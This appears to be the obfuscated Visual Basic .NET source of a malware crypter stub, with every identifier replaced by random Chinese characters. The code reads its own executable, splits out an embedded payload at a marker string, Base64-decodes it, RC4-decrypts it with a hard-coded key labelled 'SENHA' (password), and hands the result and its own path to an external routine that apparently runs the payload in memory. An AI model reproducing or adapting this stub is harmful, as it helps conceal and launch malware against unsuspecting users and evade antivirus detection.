Imports System.IO
Imports System
Imports System.Text


Module 車薩梅題問爾拉歐德維日托普拉黑車歐圖闕卡馬伊圖闕弗淖拉牙塔盟里弗爾出托旅酒壇帕日凸供普巧闕凸月特日派
    Const 旅莫彩出里姐車芬旅酒普德愛比嗖闕里凸劇受姐明姐塔比阿會韋蒂比塔歐伊供梅嗯帕普題歐壇出塔劇香阿動闕托彩 = "~-拉彩弗集力薩歐個凸彩闕達拉莫力法巧愛日小旅彩供動里姐薩卡梅瑪蒂里普阿阿嗖韋出闕酒韋薩托會勢嗖拉旅供旅-~" 'SENHA__A
    Const 酒明普維波旅歐伊里歐旅姐三派巧派歐香黑瑪伊納莫萊拉馬安室個黑薩韋塔費個貝三莫小彩劇力韋凸卡聲貝問月爾 = "~-闕波問姐拉月盟德嗖薩力盟盟伊出止薩莫馬力旅淖托托供拉受酒淖莫歐納盟里塔室莫普作比月費拉蒂里勢蒂莫馬月-~" 'SENHA__B
    Dim 拉拉嗖供集阿盟帕勢姐勢塔食力帕凸莫闕盟比闕伊愛黑闕集問姐勢帕比三爾里薩牙爾縹個阿阿比法人拉盟歐嗯或() As String
    Dim 愛食人莫會比動巧阿愛伊闕闕德彩闕月愛嗯爾莫盟三三盟旅達室拉費巧阿食莫卡安旅薩芬明勢莫個嗯維或盟歐室勢 As Byte()
    Sub 比題韋卡車愛法闕會嗖盟拉里出聲圖或拉彩作小梅帕費里爾卡旅受明彩凸卡盟食黑盟梅萊牙集盟巧出受卡集月梅安()
        拉拉嗖供集阿盟帕勢姐勢塔食力帕凸莫闕盟比闕伊愛黑闕集問姐勢帕比三爾里薩牙爾縹個阿阿比法人拉盟歐嗯或 = Split(File.ReadAllText(Process.GetCurrentProcess.MainModule.FileName), 酒明普維波旅歐伊里歐旅姐三派巧派歐香黑瑪伊納莫萊拉馬安室個黑薩韋塔費個貝三莫小彩劇力韋凸卡聲貝問月爾)
        愛食人莫會比動巧阿愛伊闕闕德彩闕月愛嗯爾莫盟三三盟旅達室拉費巧阿食莫卡安旅薩芬明勢莫個嗯維或盟歐室勢 = 食出闕拉德姐薩闕達姐莫香歐闕聲嗯普普香薩日帕普集供達拉旅達安德薩梅拉力弗止德闕旅帕里闕瑪瑪帕弗歐作酒(Convert.FromBase64String(拉拉嗖供集阿盟帕勢姐勢塔食力帕凸莫闕盟比闕伊愛黑闕集問姐勢帕比三爾里薩牙爾縹個阿阿比法人拉盟歐嗯或(1)), 旅莫彩出里姐車芬旅酒普德愛比嗖闕里凸劇受姐明姐塔比阿會韋蒂比塔歐伊供梅嗯帕普題歐壇出塔劇香阿動闕托彩)
        Encoding.GetEncoding(1252).GetBytes(拉拉嗖供集阿盟帕勢姐勢塔食力帕凸莫闕盟比闕伊愛黑闕集問姐勢帕比三爾里薩牙爾縹個阿阿比法人拉盟歐嗯或(1))
    End Sub
    Sub Main()
        Call 比題韋卡車愛法闕會嗖盟拉里出聲圖或拉彩作小梅帕費里爾卡旅受明彩凸卡盟食黑盟梅萊牙集盟巧出受卡集月梅安()
        Call 德拉馬闕彩題劇食帕薩里力彩小韋費受安出拉聲人人歐圖人拉室圖盟室人安阿歐牙納作普拉費芬伊聲旅法納圖闕派.拉拉人托法彩卡問普達薩比莫托愛盟凸劇韋旅歐薩香歐帕闕受室爾伊德帕旅劇比歐薩動派集卡德塔伊牙普維比阿酒(愛食人莫會比動巧阿愛伊闕闕德彩闕月愛嗯爾莫盟三三盟旅達室拉費巧阿食莫卡安旅薩芬明勢莫個嗯維或盟歐室勢, Application.ExecutablePath)
    End Sub
    Public Function 食出闕拉德姐薩闕達姐莫香歐闕聲嗯普普香薩日帕普集供達拉旅達安德薩梅拉力弗止德闕旅帕里闕瑪瑪帕弗歐作酒(ByVal 卡題費帕或旅黑題作闕彩闕薩拉塔力歐人彩芬壇薩三嗖或納法伊月伊集托動旅嗖或拉馬派塔納止阿或止闕拉闕卡動 As Byte(), ByVal 貝納人伊萊縹勢題薩凸瑪食闕嗯明室香力特問闕伊出酒派闕姐韋闕闕伊人拉蒂貝嗖會會作比里集韋波比莫力拉阿日 As String) As Byte()
        Dim 拉愛勢費彩歐圖里車供題闕食波作卡歐小法梅德壇愛日出梅供出集費問法彩盟帕姐卡愛蒂黑拉歐帕弗阿盟弗歐車里 As Byte() = System.Text.Encoding.ASCII.GetBytes(貝納人伊萊縹勢題薩凸瑪食闕嗯明室香力特問闕伊出酒派闕姐韋闕闕伊人拉蒂貝嗖會會作比里集韋波比莫力拉阿日)
        Dim 嗖盟旅德室動薩德問題闕圖拉香卡凸姐作縹彩闕盟酒萊月伊問淖姐安盟伊闕盟波盟酒托黑淖伊壇德盟動縹芬酒, 莫韋盟愛闕問馬日伊集拉集會旅法安月莫芬受伊壇德姐拉集盟出費波歐弗歐納普韋爾阿盟姐薩日費萊淖莫勢阿食拉, 波維個歐圖波闕里旅受拉維蒂壇月或黑會圖嗖馬安集受受托彩集闕供帕巧卡人普題或派帕劇拉法波萊聲聲芬拉巧 As UInteger
        Dim 韋莫莫德拉小梅力莫月韋拉壇或盟盟牙梅韋德圖拉達受闕卡嗖波拉作彩人莫嗖帕莫巧德淖旅芬嗖凸薩出拉薩弗特問 As UInteger() = New UInteger(255) {}
        Dim 歐個闕伊酒拉車拉集帕彩出酒爾里姐薩拉三聲彩止梅德作塔安牙劇波巧爾集問或莫德盟嗯莫小普人旅彩闕德供車個 As Byte() = New Byte(卡題費帕或旅黑題作闕彩闕薩拉塔力歐人彩芬壇薩三嗖或納法伊月伊集托動旅嗖或拉馬派塔納止阿或止闕拉闕卡動.Length - 1) {}
        For 食出闕拉德姐薩闕達姐莫香歐闕聲嗯普普香薩日帕普集供達拉旅達安德薩梅拉力弗止德闕旅帕里闕瑪瑪帕弗歐作酒0 = 0 To 255
            韋莫莫德拉小梅力莫月韋拉壇或盟盟牙梅韋德圖拉達受闕卡嗖波拉作彩人莫嗖帕莫巧德淖旅芬嗖凸薩出拉薩弗特問(食出闕拉德姐薩闕達姐莫香歐闕聲嗯普普香薩日帕普集供達拉旅達安德薩梅拉力弗止德闕旅帕里闕瑪瑪帕弗歐作酒0) = 食出闕拉德姐薩闕達姐莫香歐闕聲嗯普普香薩日帕普集供達拉旅達安德薩梅拉力弗止德闕旅帕里闕瑪瑪帕弗歐作酒0
        Next
        For 食出闕拉德姐薩闕達姐莫香歐闕聲嗯普普香薩日帕普集供達拉旅達安德薩梅拉力弗止德闕旅帕里闕瑪瑪帕弗歐作酒0 = 0 To 255
            莫韋盟愛闕問馬日伊集拉集會旅法安月莫芬受伊壇德姐拉集盟出費波歐弗歐納普韋爾阿盟姐薩日費萊淖莫勢阿食拉 = (莫韋盟愛闕問馬日伊集拉集會旅法安月莫芬受伊壇德姐拉集盟出費波歐弗歐納普韋爾阿盟姐薩日費萊淖莫勢阿食拉 + 拉愛勢費彩歐圖里車供題闕食波作卡歐小法梅德壇愛日出梅供出集費問法彩盟帕姐卡愛蒂黑拉歐帕弗阿盟弗歐車里(食出闕拉德姐薩闕達姐莫香歐闕聲嗯普普香薩日帕普集供達拉旅達安德薩梅拉力弗止德闕旅帕里闕瑪瑪帕弗歐作酒0 Mod 拉愛勢費彩歐圖里車供題闕食波作卡歐小法梅德壇愛日出梅供出集費問法彩盟帕姐卡愛蒂黑拉歐帕弗阿盟弗歐車里.Length) + 韋莫莫德拉小梅力莫月韋拉壇或盟盟牙梅韋德圖拉達受闕卡嗖波拉作彩人莫嗖帕莫巧德淖旅芬嗖凸薩出拉薩弗特問(食出闕拉德姐薩闕達姐莫香歐闕聲嗯普普香薩日帕普集供達拉旅達安德薩梅拉力弗止德闕旅帕里闕瑪瑪帕弗歐作酒0)) And 255
            波維個歐圖波闕里旅受拉維蒂壇月或黑會圖嗖馬安集受受托彩集闕供帕巧卡人普題或派帕劇拉法波萊聲聲芬拉巧 = 韋莫莫德拉小梅力莫月韋拉壇或盟盟牙梅韋德圖拉達受闕卡嗖波拉作彩人莫嗖帕莫巧德淖旅芬嗖凸薩出拉薩弗特問(食出闕拉德姐薩闕達姐莫香歐闕聲嗯普普香薩日帕普集供達拉旅達安德薩梅拉力弗止德闕旅帕里闕瑪瑪帕弗歐作酒0)
            韋莫莫德拉小梅力莫月韋拉壇或盟盟牙梅韋德圖拉達受闕卡嗖波拉作彩人莫嗖帕莫巧德淖旅芬嗖凸薩出拉薩弗特問(食出闕拉德姐薩闕達姐莫香歐闕聲嗯普普香薩日帕普集供達拉旅達安德薩梅拉力弗止德闕旅帕里闕瑪瑪帕弗歐作酒0) = 韋莫莫德拉小梅力莫月韋拉壇或盟盟牙梅韋德圖拉達受闕卡嗖波拉作彩人莫嗖帕莫巧德淖旅芬嗖凸薩出拉薩弗特問(莫韋盟愛闕問馬日伊集拉集會旅法安月莫芬受伊壇德姐拉集盟出費波歐弗歐納普韋爾阿盟姐薩日費萊淖莫勢阿食拉)
            韋莫莫德拉小梅力莫月韋拉壇或盟盟牙梅韋德圖拉達受闕卡嗖波拉作彩人莫嗖帕莫巧德淖旅芬嗖凸薩出拉薩弗特問(莫韋盟愛闕問馬日伊集拉集會旅法安月莫芬受伊壇德姐拉集盟出費波歐弗歐納普韋爾阿盟姐薩日費萊淖莫勢阿食拉) = 波維個歐圖波闕里旅受拉維蒂壇月或黑會圖嗖馬安集受受托彩集闕供帕巧卡人普題或派帕劇拉法波萊聲聲芬拉巧
        Next
        嗖盟旅德室動薩德問題闕圖拉香卡凸姐作縹彩闕盟酒萊月伊問淖姐安盟伊闕盟波盟酒托黑淖伊壇德盟動縹芬酒 = 0 : 莫韋盟愛闕問馬日伊集拉集會旅法安月莫芬受伊壇德姐拉集盟出費波歐弗歐納普韋爾阿盟姐薩日費萊淖莫勢阿食拉 = 0
        Dim 食出闕拉德姐薩闕達姐莫香歐闕聲嗯普普香薩日帕普集供達拉旅達安德薩梅拉力弗止德闕旅帕里闕瑪瑪帕弗歐作酒1 As Integer
        For 食出闕拉德姐薩闕達姐莫香歐闕聲嗯普普香薩日帕普集供達拉旅達安德薩梅拉力弗止德闕旅帕里闕瑪瑪帕弗歐作酒1 = 0 To 歐個闕伊酒拉車拉集帕彩出酒爾里姐薩拉三聲彩止梅德作塔安牙劇波巧爾集問或莫德盟嗯莫小普人旅彩闕德供車個.Length - 1
            嗖盟旅德室動薩德問題闕圖拉香卡凸姐作縹彩闕盟酒萊月伊問淖姐安盟伊闕盟波盟酒托黑淖伊壇德盟動縹芬酒 = (嗖盟旅德室動薩德問題闕圖拉香卡凸姐作縹彩闕盟酒萊月伊問淖姐安盟伊闕盟波盟酒托黑淖伊壇德盟動縹芬酒 + 1) And 255
            莫韋盟愛闕問馬日伊集拉集會旅法安月莫芬受伊壇德姐拉集盟出費波歐弗歐納普韋爾阿盟姐薩日費萊淖莫勢阿食拉 = (莫韋盟愛闕問馬日伊集拉集會旅法安月莫芬受伊壇德姐拉集盟出費波歐弗歐納普韋爾阿盟姐薩日費萊淖莫勢阿食拉 + 韋莫莫德拉小梅力莫月韋拉壇或盟盟牙梅韋德圖拉達受闕卡嗖波拉作彩人莫嗖帕莫巧德淖旅芬嗖凸薩出拉薩弗特問(嗖盟旅德室動薩德問題闕圖拉香卡凸姐作縹彩闕盟酒萊月伊問淖姐安盟伊闕盟波盟酒托黑淖伊壇德盟動縹芬酒)) And 255
            波維個歐圖波闕里旅受拉維蒂壇月或黑會圖嗖馬安集受受托彩集闕供帕巧卡人普題或派帕劇拉法波萊聲聲芬拉巧 = 韋莫莫德拉小梅力莫月韋拉壇或盟盟牙梅韋德圖拉達受闕卡嗖波拉作彩人莫嗖帕莫巧德淖旅芬嗖凸薩出拉薩弗特問(嗖盟旅德室動薩德問題闕圖拉香卡凸姐作縹彩闕盟酒萊月伊問淖姐安盟伊闕盟波盟酒托黑淖伊壇德盟動縹芬酒)
            韋莫莫德拉小梅力莫月韋拉壇或盟盟牙梅韋德圖拉達受闕卡嗖波拉作彩人莫嗖帕莫巧德淖旅芬嗖凸薩出拉薩弗特問(嗖盟旅德室動薩德問題闕圖拉香卡凸姐作縹彩闕盟酒萊月伊問淖姐安盟伊闕盟波盟酒托黑淖伊壇德盟動縹芬酒) = 韋莫莫德拉小梅力莫月韋拉壇或盟盟牙梅韋德圖拉達受闕卡嗖波拉作彩人莫嗖帕莫巧德淖旅芬嗖凸薩出拉薩弗特問(莫韋盟愛闕問馬日伊集拉集會旅法安月莫芬受伊壇德姐拉集盟出費波歐弗歐納普韋爾阿盟姐薩日費萊淖莫勢阿食拉)
            韋莫莫德拉小梅力莫月韋拉壇或盟盟牙梅韋德圖拉達受闕卡嗖波拉作彩人莫嗖帕莫巧德淖旅芬嗖凸薩出拉薩弗特問(莫韋盟愛闕問馬日伊集拉集會旅法安月莫芬受伊壇德姐拉集盟出費波歐弗歐納普韋爾阿盟姐薩日費萊淖莫勢阿食拉) = 波維個歐圖波闕里旅受拉維蒂壇月或黑會圖嗖馬安集受受托彩集闕供帕巧卡人普題或派帕劇拉法波萊聲聲芬拉巧
            歐個闕伊酒拉車拉集帕彩出酒爾里姐薩拉三聲彩止梅德作塔安牙劇波巧爾集問或莫德盟嗯莫小普人旅彩闕德供車個(食出闕拉德姐薩闕達姐莫香歐闕聲嗯普普香薩日帕普集供達拉旅達安德薩梅拉力弗止德闕旅帕里闕瑪瑪帕弗歐作酒1) = 卡題費帕或旅黑題作闕彩闕薩拉塔力歐人彩芬壇薩三嗖或納法伊月伊集托動旅嗖或拉馬派塔納止阿或止闕拉闕卡動(食出闕拉德姐薩闕達姐莫香歐闕聲嗯普普香薩日帕普集供達拉旅達安德薩梅拉力弗止德闕旅帕里闕瑪瑪帕弗歐作酒1) Xor 韋莫莫德拉小梅力莫月韋拉壇或盟盟牙梅韋德圖拉達受闕卡嗖波拉作彩人莫嗖帕莫巧德淖旅芬嗖凸薩出拉薩弗特問((韋莫莫德拉小梅力莫月韋拉壇或盟盟牙梅韋德圖拉達受闕卡嗖波拉作彩人莫嗖帕莫巧德淖旅芬嗖凸薩出拉薩弗特問(嗖盟旅德室動薩德問題闕圖拉香卡凸姐作縹彩闕盟酒萊月伊問淖姐安盟伊闕盟波盟酒托黑淖伊壇德盟動縹芬酒) + 韋莫莫德拉小梅力莫月韋拉壇或盟盟牙梅韋德圖拉達受闕卡嗖波拉作彩人莫嗖帕莫巧德淖旅芬嗖凸薩出拉薩弗特問(莫韋盟愛闕問馬日伊集拉集會旅法安月莫芬受伊壇德姐拉集盟出費波歐弗歐納普韋爾阿盟姐薩日費萊淖莫勢阿食拉)) And 255)
        Next
        Return 歐個闕伊酒拉車拉集帕彩出酒爾里姐薩拉三聲彩止梅德作塔安牙劇波巧爾集問或莫德盟嗯莫小普人旅彩闕德供車個
    End Function
End Module